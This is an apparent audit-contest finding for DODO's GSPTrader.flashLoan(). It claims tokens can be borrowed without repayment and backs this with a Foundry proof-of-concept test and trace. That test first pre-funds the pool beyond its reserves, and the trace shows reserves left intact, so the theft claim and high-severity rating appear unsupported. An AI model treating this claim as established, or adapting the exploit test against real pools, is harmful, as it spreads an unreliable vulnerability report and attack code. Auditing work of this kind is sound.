Obedient Glass Salmon

high

# Base token and Quote token in GSPTrader.sol can be stolen via GSPTrader.flashLoan()

## Summary
There's no check to ensure the GSPTrader.flashLoan() is used the way it is meant to be used, malicious actors could use it to steal funds from the GSPTrader.sol contract.
## Vulnerability Detail
According to the docs [here](https://docs.dodoex.io/en/developer/contracts/dodo-v1-v2/guides/flash-loan#flash-loan-mechanism)

The flashloan mechanism is thus:

1. Invoke the flashLoan function in the pool contract.
2. The pool sends the base and quote tokens to the applicant (where baseAmount or quoteAmount can be lent to 0).
3. If the flashLoan function is called with data that is not empty, the contract calls the DVMFlashLoanCall or DPPFlashLoanCall method (corresponding to public and private pools) passed by the applicant into the assetTo contract address.
4. After the DVMFlashLoanCall or DPPFlashLoanCall is executed, the tokens will be returned and the contract will calculate if the pool is losing money. If it is losing money, the transaction will fail immediately. 

Checking the No.3 and 4 of the flashloan mechanism above, the contract passed into `assetTo` is supposed to have DVMFlashLoanCall or DPPFlashLoanCall method (corresponding to public and private pools) and After the DVMFlashLoanCall or DPPFlashLoanCall is executed, the method ensures the tokens are returned via their flashloan callback. see an example [here](https://github.com/DODOEX/dodo-example/blob/724094e74d408b19e7392f0f8ce043945f8041fa/solidity/contracts/DODOFlashloan.sol#L62)

The issue is that tokens may not be returned because a malicious actor could use his own contract to call GSPTrader.flashoan() and pass in his EOA address as `assetTo`. He just has to make sure that data.length is == 0, that way he avoids this call ` IDODOCallee(assetTo).DSPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);` that could possibly revert the Tx  then he is able to steal the tokens from GSPTrader.sol  contract as they'll never be returned

```solidity
 function flashLoan(//@audit-issue flashloans can be taken without being paid back.
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external nonReentrant {
        _transferBaseOut(assetTo, baseAmount);
        _transferQuoteOut(assetTo, quoteAmount);

        if (data.length > 0)
            IDODOCallee(assetTo).DSPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);

        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_;
        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_;

        // no input -> pure loss
        require(
            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,
            "FLASH_LOAN_FAILED"
        );

        // sell quote case
        // quote input + base output
        if (baseBalance < _BASE_RESERVE_) {
            uint256 quoteInput = quoteBalance - uint256(_QUOTE_RESERVE_);
            (
                uint256 receiveBaseAmount,
                uint256 mtFee,
                PMMPricing.RState newRState,
                uint256 newQuoteTarget
            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve
            require(
                (uint256(_BASE_RESERVE_) - baseBalance) <= receiveBaseAmount,
                "FLASH_LOAN_FAILED"
            );
            
            _MT_FEE_BASE_ = _MT_FEE_BASE_ + mtFee;
            
            if (_RState_ != uint32(newRState)) {
                require(newQuoteTarget <= type(uint112).max, "OVERFLOW");
                _QUOTE_TARGET_ = uint112(newQuoteTarget);
                _RState_ = uint32(newRState);
                emit RChange(newRState);
            }
            emit DODOSwap(
                address(_QUOTE_TOKEN_),
                address(_BASE_TOKEN_),
                quoteInput,
                receiveBaseAmount,
                msg.sender,
                assetTo
            );
        }

        // sell base case
        // base input + quote output
        if (quoteBalance < _QUOTE_RESERVE_) {
            uint256 baseInput = baseBalance - uint256(_BASE_RESERVE_);
            (
                uint256 receiveQuoteAmount,
                uint256 mtFee,
                PMMPricing.RState newRState,
                uint256 newBaseTarget
            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve
            require(
                (uint256(_QUOTE_RESERVE_) - quoteBalance) <= receiveQuoteAmount,
                "FLASH_LOAN_FAILED"
            );

            _MT_FEE_QUOTE_ = _MT_FEE_QUOTE_ + mtFee;
            
            if (_RState_ != uint32(newRState)) {
                require(newBaseTarget <= type(uint112).max, "OVERFLOW");
                _BASE_TARGET_ = uint112(newBaseTarget);
                _RState_ = uint32(newRState);
                emit RChange(newRState);
            }
            emit DODOSwap(
                address(_BASE_TOKEN_),
                address(_QUOTE_TOKEN_),
                baseInput,
                receiveQuoteAmount,
                msg.sender,
                assetTo
            );
        }

        _sync();

        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);
    }

```
Here's my POC to better explain this issue
just copy and paste into GPSTrader.t.sol
```solidity
function test_flashloan_Isnt_repaid() public {
        // transfer some tokens to GSP
        vm.startPrank(DAI_WHALE);
        dai.transfer(address(gsp), BASE_RESERVE + BASE_INPUT);
        vm.stopPrank();
        vm.startPrank(USDC_WHALE);
        usdc.transfer(address(gsp), QUOTE_RESERVE + QUOTE_INPUT);
        vm.stopPrank();



        vm.startPrank(USER);
        //buy shares to make _BASE_TARGET_ > 0
        //gsp.buyShares(USER);

        // record user's previous balance
        uint256 baseBalanceBefore = dai.balanceOf(USER);
        uint256 quoteBalanceBefore = usdc.balanceOf(USER);
        console.log(baseBalanceBefore, quoteBalanceBefore);// 0,0 here

        // flashloan
        gsp.flashLoan(BASE_INPUT, QUOTE_INPUT, USER, "");
        
        //confirm that user received tokens without paying back.
        uint256 baseBalanceAfter = dai.balanceOf(USER);
        uint256 quoteBalanceAfter = usdc.balanceOf(USER);
        console.log(baseBalanceAfter, quoteBalanceAfter);//  1000000000000000000, 2000000 here


        vm.stopPrank();
        
    }

```
run with forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/ YOUR API ID
```bash
Running 1 test for test/GPSTrader.t.sol:TestGSPTrader
[PASS] test_flashloan_Isnt_repaid() (gas: 208159)
Logs:
  0 0 <----@here User prev balance before flashLoan
  1000000000000000000 2000000 <----@here user balance after the flashLoan

Traces:
  [8919418] TestGSPTrader::setUp()
    ├─ [3770561] → new DeployGSP@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← 18721 bytes of code
    ├─ [3910972] DeployGSP::run()
    │   ├─ [3666702] → new GSP@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← 18081 bytes of code
    │   ├─ [207009] GSP::init(0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0, 0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0, 10000000000000 [1e13], 1000000 [1e6], 500000000000000 [5e14], false)
    │   │   └─ ← ()
    │   └─ ← GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    ├─ [510409] → new MockERC20@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← 2208 bytes of code
    ├─ [22784] MockERC20::mint(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← ()
    ├─ [510409] → new MockERC20@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← 2208 bytes of code
    ├─ [22784] MockERC20::mint(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← ()
    └─ ← ()

  [208159] TestGSPTrader::test_flashloan_Isnt_repaid()
    ├─ [0] VM::startPrank(0x25B313158Ce11080524DcA0fD01141EeD5f94b81)
    │   └─ ← ()
    ├─ [30174] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 11000000000000000000 [1.1e19])
    │   ├─ emit Transfer(from: 0x25B313158Ce11080524DcA0fD01141EeD5f94b81, to: GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], amount: 11000000000000000000 [1.1e19])
    │   └─ ← true
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0x51eDF02152EBfb338e03E30d65C15fBf06cc9ECC)
    │   └─ ← ()
    ├─ [44017] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 12000000 [1.2e7])
    │   ├─ [36728] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 12000000 [1.2e7]) [delegatecall]
    │   │   ├─ emit Transfer(from: 0x51eDF02152EBfb338e03E30d65C15fBf06cc9ECC, to: GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], amount: 12000000 [1.2e7])
    │   │   └─ ← true
    │   └─ ← true
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    │   └─ ← ()
    ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [staticcall]
    │   └─ ← 0
    ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [staticcall]
    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [delegatecall]
    │   │   └─ ← 0
    │   └─ ← 0
    ├─ [0] console::6c0f6980(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← ()
    ├─ [98112] GSP::flashLoan(1000000000000000000 [1e18], 2000000 [2e6], 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 0x)
    │   ├─ [23374] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 1000000000000000000 [1e18])
    │   │   ├─ emit Transfer(from: GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], to: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, amount: 1000000000000000000 [1e18])
    │   │   └─ ← true
    │   ├─ [26717] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 2000000 [2e6])
    │   │   ├─ [25928] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 2000000 [2e6]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], to: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, amount: 2000000 [2e6])
    │   │   │   └─ ← true
    │   │   └─ ← true
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   └─ ← 10000000000000000000 [1e19]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
    │   │   │   └─ ← 10000000 [1e7]
    │   │   └─ ← 10000000 [1e7]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   └─ ← 10000000000000000000 [1e19]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(GSP: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
    │   │   │   └─ ← 10000000 [1e7]
    │   │   └─ ← 10000000 [1e7]
    │   ├─ emit DODOFlashLoan(borrower: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, assetTo: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, baseAmount: 1000000000000000000 [1e18], quoteAmount: 2000000 [2e6])
    │   └─ ← ()
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [staticcall]
    │   └─ ← 1000000000000000000 [1e18]
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [delegatecall]
    │   │   └─ ← 2000000 [2e6]
    │   └─ ← 2000000 [2e6]
    ├─ [0] console::6c0f6980(0000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000001e8480) [staticcall]
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.89s
```

## Impact
Malicious actor can steal Base token and Quote token in GSPTrader.sol via GSPTrader.flashoan().
Severity is HIGH as the Base token and Quote token in GSPTrader.sol can be stolen

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L122-L212
## Tool used

Manual Review

## Recommendation
There should be a compulsory check on the address inserted as `assetTo` to ensure it has DSPFlashLoanCall method, that way it is guaranteed that the tokens loaned will be returned because the DSPFlashLoanCall method carries the logic to return the flashloaned tokens. see an example [here](https://github.com/DODOEX/dodo-example/blob/724094e74d408b19e7392f0f8ce043945f8041fa/solidity/contracts/DODOFlashloan.sol#L62)

Also, implementing a compulsory check on the address inserted as `assetTo` will ensure the function is used as it's supposed to, because GSPTrader.flashLoan() will now always revert on EOA's and contracts without the  DSPFlashLoanCall method being  inserted as `assetTo`.

Maybe this check below shouldn't be in an IF statement:
```solidity
 if (data.length > 0)
            IDODOCallee(assetTo).DSPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);
```
or maybe just find another way to ensure `assetTo` has DSPFlashLoanCall method